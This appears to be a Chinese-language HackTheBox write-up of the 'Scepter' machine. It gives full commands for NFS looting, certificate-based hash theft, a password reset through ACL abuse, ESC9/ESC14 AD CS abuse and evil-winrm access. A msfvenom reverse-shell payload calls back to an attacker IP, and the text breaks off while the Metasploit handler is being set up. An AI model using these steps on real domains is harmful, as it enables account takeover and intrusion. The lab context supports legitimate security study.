{"pageProps":{"postData":{"id":"HackTheBoxMachine - Scepter","contentHtml":"<h1>Machine - Scepter</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Scepter\">https://app.hackthebox.com/machines/Scepter</a> | <code>Hard</code></p>\n</blockquote>\n<p>PS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.65\nHost is up (0.30s latency).\nNot shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n53/tcp  open  domain\n111/tcp open  rpcbind\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 66.89 seconds\n</code></pre>\n<p><code>Windows</code> 靶机的端口，但不一定是域控主机（PS:后面才知道我扫描出来的端口shao）</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.65\nHost is up (0.40s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n111/tcp open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  4           2049/tcp   nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro\nsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143\n93 (91%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   <span class=\"hljs-built_in\">date</span>: 2025-04-24T22:05:35\n|_  start_date: N/A\n|_clock-skew: 7h40m16s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   464.44 ms 10.10.16.1\n2   291.53 ms 10.10.11.65\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 251.59 seconds\n</code></pre>\n<h2>NFS</h2>\n<pre><code class=\"hljs language-bash\">rpcdump.py scepter.htb -target-ip 10.10.11.65\n</code></pre>\n<p>很多的信息，尝试从里面获取有用的信息，结果保存在 <code>rpcdump_resule.txt</code></p>\n<p>主机为 <code>DC01.scepter.htb</code> ，那就能确定是域控了</p>\n<p>NMAP 中扫描出了靶机开启了 NFS，尝试一下匿名访问。</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter showmount -e 10.10.11.65\nExport list <span class=\"hljs-keyword\">for</span> 10.10.11.65:\n/helpdesk (everyone)\n\n➜  Scepter <span class=\"hljs-built_in\">mkdir</span> nfs\n➜  Scepter <span class=\"hljs-built_in\">sudo</span> mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs\n\n➜  Scepter <span class=\"hljs-built_in\">cd</span> nfs   \n➜  nfs <span class=\"hljs-built_in\">ls</span>\nbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx\n</code></pre>\n<h2>To D.baker</h2>\n<p>使用 openssl 查看 <code>baker.crt</code> 的内容</p>\n<pre><code class=\"hljs language-bash\">➜  nfs_backup openssl x509 -<span class=\"hljs-keyword\">in</span> baker.crt -text -noout\nCertificate:                                                                                                                                                                                                    \n    Data:                                 \n        Version: 3 (0x2)                                                                                                                                                                                        \n        Serial Number:            \n            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32\n        Signature Algorithm: sha256WithRSAEncryption \n        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA\n        Validity                       \n            Not Before: Nov  2 01:13:46 2024 GMT                                                        \n            Not After : Nov  2 01:13:46 2025 GMT\n        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb\n        Subject Public Key Info:         \n            Public Key Algorithm: rsaEncryption\n                Public-Key: (2048 bit)                                         \n</code></pre>\n<p>尝试生成 <code>pfx</code> 文件，用于认证的密码是 <code>newpassword</code> （暂时不知道如何获得，弱密码？），新设置密码为空密码</p>\n<pre><code class=\"hljs language-bash\">➜  nfs_backup openssl pkcs12 -<span class=\"hljs-built_in\">export</span> -out baker.pfx -inkey baker.key -<span class=\"hljs-keyword\">in</span> baker.crt\nEnter pass phrase <span class=\"hljs-keyword\">for</span> baker.key:\nEnter Export Password:\nVerifying - Enter Export Password:\n</code></pre>\n<p>通过 <code>certipy-ad</code> 提取用户 hash</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter <span class=\"hljs-built_in\">sudo</span> ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: d.baker@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to <span class=\"hljs-string\">'d.baker.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'d.baker'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'d.baker@scepter.htb'</span>: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n</code></pre>\n<pre><code class=\"hljs language-bash\">aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n</code></pre>\n<p>检查密码有效性</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.65     389    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter bloodhound-python -u <span class=\"hljs-string\">'d.baker'</span> -d <span class=\"hljs-string\">'scepter.htb'</span> -ns 10.10.11.65 --zip -c All -dc <span class=\"hljs-string\">'DC01.scepter.htb'</span> --hashes <span class=\"hljs-string\">'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'</span>   \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 27S\nINFO: Compressing output into 20250425062047_bloodhound.zip\n</code></pre>\n<h2>To A.carter</h2>\n<h3>权限滥用</h3>\n<p>BloodHound分析，<code>d.baker</code> 属于 <code>STAFF ACCESS CERTICICATE</code> 的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image.png\" alt=\"image.png\"></p>\n<p>因为这个关系，<code>d.baker</code> 可以修改 <code>a.carter</code> 的密码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image1.png\" alt=\"image.png\"></p>\n<p>修改密码 <code>123456</code></p>\n<pre><code class=\"hljs language-bash\">➜  nfs_backup changepasswd.py <span class=\"hljs-string\">'scepter.htb/a.carter@10.10.11.65'</span> -newpass 123456 -altuser <span class=\"hljs-string\">'d.baker'</span> -althash <span class=\"hljs-string\">'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'</span> -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of scepter.htb\\a.carter as scepter.htb\\d.baker\n[*] Connecting to DCE/RPC as scepter.htb\\d.baker\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys <span class=\"hljs-keyword\">for</span> Kerberos, <span class=\"hljs-keyword\">until</span> they change their password again.\n</code></pre>\n<p>检验是否修改成功</p>\n<pre><code class=\"hljs language-bash\">➜  nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       \nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\a.carter:123456 \n</code></pre>\n<h2>To H.brown</h2>\n<p>通过 BloodHound 查看一下 a.carter 的权限。对 <code>STAFF ACCESS CERTIFICATE</code> 有 GenericAll 权限</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image2.png\" alt=\"image.png\"></p>\n<p>赋予 a.carter 对<code>STAFF ACCESS CERTIFICATE</code>  <code>Fullcontrol</code> 权限</p>\n<pre><code class=\"hljs language-bash\">➜  nfs_backup dacledit.py -action <span class=\"hljs-string\">'write'</span> -rights <span class=\"hljs-string\">'FullControl'</span> -inheritance -principal <span class=\"hljs-string\">'a.carter'</span> -target-dn <span class=\"hljs-string\">'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB'</span> <span class=\"hljs-string\">'scepter.htb'</span>/<span class=\"hljs-string\">'a.carter'</span>:<span class=\"hljs-string\">'123456'</span>\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20250425-071815.bak\n[*] DACL modified successfully!\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter bloodhound-python -u <span class=\"hljs-string\">'a.carter'</span> -p <span class=\"hljs-string\">'123456'</span> -d <span class=\"hljs-string\">'scepter.htb'</span> -ns 10.10.11.65 --zip -c All -dc <span class=\"hljs-string\">'DC01.scepter.htb'</span> \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 31S\nINFO: Compressing output into 20250425071924_bloodhound.zip\n</code></pre>\n<p>粗略一看没找到链子，先找找下一个目标账户，查看了用户后发现 <code>h.brown</code> 是远程管理组成员，暂且将其作为目标用户。</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image3.png\" alt=\"image.png\"></p>\n<h3>ESC9</h3>\n<p>一开始给我们提供的就是证书来获得用户，所以知识点可能在 AD CS</p>\n<p>使用 certipy 收集数据</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 35 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 13 enabled certificate templates\n[*] Trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'scepter-DC01-CA'</span> via CSRA\n[!] Got error <span class=\"hljs-keyword\">while</span> trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'scepter-DC01-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'scepter-DC01-CA'</span> via RRP\n[!] Got error <span class=\"hljs-keyword\">while</span> trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'scepter-DC01-CA'</span> via RRP: The NETBIOS connection with the remote host timed out.\n[!] Failed to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'scepter-DC01-CA'</span>\n[*] Saved BloodHound data to <span class=\"hljs-string\">'20250425111914_Certipy.zip'</span>. Drag and drop the file into the BloodHound GUI from @ly4k\n</code></pre>\n<p>ESC4 也有，但是我们当前的用户无法实现。最后发现 <code>ESC9</code> 貌似是我们当前可以利用的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image4.png\" alt=\"image.png\"></p>\n<p>利用链接：<a href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension\">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension</a></p>\n<p>该组织属性：</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Any Purpose</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Authorized Signatures Required</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Certificate Authorities</td>\n<td>scepter-DC01-CA</td>\n</tr>\n<tr>\n<td>Certificate Name Flag</td>\n<td>SubjectRequireEmailSubjectRequireDnsAsCnSubjectAltRequireEmail</td>\n</tr>\n<tr>\n<td>Client Authentication</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Display Name</td>\n<td>StaffAccessCertificate</td>\n</tr>\n<tr>\n<td>Enabled</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Enrollee Supplies Subject</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Enrollment Agent</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Enrollment Flag</td>\n<td>NoSecurityExtensionAutoEnrollment</td>\n</tr>\n<tr>\n<td>Extended Key Usage</td>\n<td>Client AuthenticationServer Authentication</td>\n</tr>\n<tr>\n<td>Minimum RSA Key Length</td>\n<td>2,048</td>\n</tr>\n<tr>\n<td>Private Key Flag</td>\n<td>16842752</td>\n</tr>\n<tr>\n<td>Renewal Period</td>\n<td>6 weeks</td>\n</tr>\n<tr>\n<td>Requires Key Archival</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Requires Manager Approval</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Template Name</td>\n<td>StaffAccessCertificate</td>\n</tr>\n<tr>\n<td>Validity Period</td>\n<td>99 years</td>\n</tr>\n<tr>\n<td>Domain</td>\n<td>SCEPTER.HTB</td>\n</tr>\n<tr>\n<td>Type</td>\n<td>Certificate Template</td>\n</tr>\n</tbody>\n</table>\n<p>来自上面的链接：在此方案中，user1 对 user2 具有 <code>GenericWrite</code>，并希望入侵 user3。允许 user2 注册一个易受攻击的模板，该模板在 <code>msPKI-Enrollment-Flag</code> 值中指定 <code>CT_FLAG_NO_SECURITY_EXTENSION</code> 标志。</p>\n<pre><code class=\"hljs language-bash\">certipy-ad shadow auto -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -user d.baker -upn h.brown -dc-ip 10.10.11.65\ncertipy-ad req -username <span class=\"hljs-string\">\"d.baker@scepter.htb\"</span> -hashes 18b5fb0d99e7a475316213c15b6f22ce -target <span class=\"hljs-string\">\"dc01.scepter.htb\"</span> -ca <span class=\"hljs-string\">'scepter-DC01-CA'</span> -template <span class=\"hljs-string\">'StaffAccessCertificate'</span> -dc-ip 10.10.11.65\ncertipy-ad account update -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -user d.baker -upn <span class=\"hljs-string\">\"d.baker@scepter\"</span> -dc-ip 10.10.11.65\ncertipy-ad auth -pfx <span class=\"hljs-string\">'h.brown.pfx'</span> -domain <span class=\"hljs-string\">\"scepter.htb\"</span> -dc-ip 10.10.11.65\n</code></pre>\n<p>执行到第三条的时候出现了如下错误</p>\n<pre><code class=\"hljs language-bash\">➜  ADCS certipy-ad req -username <span class=\"hljs-string\">\"d.baker@scepter.htb\"</span> -hashes 18b5fb0d99e7a475316213c15b6f22ce -target <span class=\"hljs-string\">\"dc01.scepter.htb\"</span> -ca <span class=\"hljs-string\">'scepter-DC01-CA'</span> -template <span class=\"hljs-string\">'StaffAccessCertificate'</span> -dc-ip 10.10.11.65\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error <span class=\"hljs-keyword\">while</span> trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.\n[*] Request ID is 38\nWould you like to save the private key? (y/N) Y\n[*] Saved private key to 38.key\n[-] Failed to request certificate\n</code></pre>\n<p>表明在证书申请过程中，<strong>证书颁发请求</strong>中需要包含 <strong>email</strong> 信息，但在你的请求中，<strong>email 信息缺失或无法获取</strong>。具体来说，错误 <code>CERTSRV_E_SUBJECT_EMAIL_REQUIRED</code> 指明，证书模板要求在 <strong>Subject</strong> 或 <strong>Subject Alternative Name (SAN)</strong> 中必须包含有效的 email 地址。</p>\n<p>询问<strong>佬</strong>们后得知可以通过 <code>BloodyAD</code> 来修改，将 d.baker 的</p>\n<pre><code class=\"hljs language-bash\">bloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb <span class=\"hljs-built_in\">set</span> object d.baker mail -v h.brown@scepter.htb\n</code></pre>\n<p>那么命令就变为</p>\n<pre><code class=\"hljs language-bash\">certipy-ad shadow auto -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -user d.baker -upn h.brown -dc-ip 10.10.11.65\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb <span class=\"hljs-built_in\">set</span> object d.baker mail -v h.brown@scepter.htb\ncertipy-ad req -username <span class=\"hljs-string\">\"d.baker@scepter.htb\"</span> -hashes 18b5fb0d99e7a475316213c15b6f22ce -target <span class=\"hljs-string\">\"dc01.scepter.htb\"</span> -ca <span class=\"hljs-string\">'scepter-DC01-CA'</span> -template <span class=\"hljs-string\">'StaffAccessCertificate'</span> -dc-ip 10.10.11.65\ncertipy-ad account update -username <span class=\"hljs-string\">\"a.carter@scepter.htb\"</span> -p <span class=\"hljs-string\">\"123456\"</span> -user d.baker -upn <span class=\"hljs-string\">\"d.baker@scepter\"</span> -dc-ip 10.10.11.65\ncertipy-ad auth -pfx <span class=\"hljs-string\">'d.baker.pfx'</span> -domain <span class=\"hljs-string\">\"scepter.htb\"</span> -dc-ip 10.10.11.65 -username h.brown\n</code></pre>\n<p>最后获得 <code>h.brown</code>  的 TGT</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter certipy-ad auth -pfx <span class=\"hljs-string\">'d.baker.pfx'</span> -domain <span class=\"hljs-string\">\"scepter.htb\"</span> -dc-ip 10.10.11.65 -username h.brown\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification <span class=\"hljs-keyword\">in</span> the provided certificate\n[*] Using principal: h.brown@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to <span class=\"hljs-string\">'h.brown.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'h.brown'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'h.brown@scepter.htb'</span>: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c\n</code></pre>\n<p>导入 TGT</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter <span class=\"hljs-built_in\">export</span> KRB5CCNAME=h.brown.ccache \n</code></pre>\n<p>编写 <code>/etc/krb5.conf</code></p>\n<pre><code class=\"hljs language-bash\">➜  Scepter <span class=\"hljs-built_in\">cat</span> /etc/krb5.conf                                                      \n[libdefaults]\n    default_realm = scepter.HTB\n    dns_lookup_realm = <span class=\"hljs-literal\">false</span>\n    dns_lookup_kdc = <span class=\"hljs-literal\">true</span>\n\n[realms]\n    SCEPTER.HTB = {\n        kdc = dc01.scepter.htb\n        admin_server = dc01.haze.htb\n    }\n\n[domain_realm]\n    .scepter.htb = scepter.HTB\n    scepter.htb = scepter.HTB\n</code></pre>\n<p>使用<code>evil-winrm</code>登录</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: User is not needed <span class=\"hljs-keyword\">for</span> Kerberos auth. Ticket will be used\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> \n</code></pre>\n<p>终于登录进来了，事不宜迟先读 user.txt</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\h.brown\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\n4e1f18052814cfb9f26a1497a8bc1cc6\n</code></pre>\n<p>收集一波数据</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> <span class=\"hljs-built_in\">whoami</span> /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working <span class=\"hljs-built_in\">set</span> Enabled\n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> <span class=\"hljs-built_in\">whoami</span> /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                        Attributes\n=========================================== ================ ========================================== ==================================================\nEveryone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group\nSCEPTER\\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group\n</code></pre>\n<h2>To P.adams</h2>\n<h3>ESC14 - <strong>对 altSecurityIdentities 的写入访问权限</strong></h3>\n<p>现在目标用户是 <code>P.adams</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image5.png\" alt=\"image.png\"></p>\n<p>枚举用户 <code>h.brown</code>  是否有修改某些对象（如组成员关系、ACL 或权限）的能力。</p>\n<pre><code class=\"hljs language-bash\">➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de\n...\ndistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb\naltSecurityIdentities: WRITE\n</code></pre>\n<p>对 <code>p.adams</code> 的 <code>altSecurityIdentities</code> 可写</p>\n<p>大概是可以利用：<a href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities\">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities</a> | <a href=\"https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9</a></p>\n<p>攻击者对目标的 <code>altSecurityIdentities</code> 属性具有写入权限。他可以将证书注册为受害者，并通过修改其 <code>altSecurityIdentities</code> 属性并将其指向获取的证书来为目标创建显式映射。然后，可以使用该证书作为目标进行身份验证。</p>\n<p>攻击根据：<a href=\"https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9</a> 的 <code>ESC14</code>场景<code>A</code></p>\n<p>先使用 h.brown 来进行上线 MSF，后续一些操作在<code>evil-winrm</code>中操作会有<code>bug</code></p>\n<pre><code class=\"hljs language-bash\">➜  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No <span class=\"hljs-built_in\">arch</span> selected, selecting <span class=\"hljs-built_in\">arch</span>: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Scepter msfconsole \nMetasploit tip: View all productivity tips with the tips <span class=\"hljs-built_in\">command</span>\n\n_                                                    _\n/ \\    /\\         __                         _   __  /_/ __\n| |\\  / | _____   \\ \\           ___   _____ | | /  \\ _   \\ \\\n| | \\/| | | ___\\ |- -|   /\\    / __\\ | -__/ | || | || | |- -|\n|_|   | | | _|__  | |_  / -\\ __\\ \\   | |    | | \\__/| |  | |_\n|/  |____/  \\___\\/ /\\ \\\\___/   \\/     \\__|    |_\\  \\___\\\n\n=[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\nmsf6 > use exploit/multi/handler \n[*] 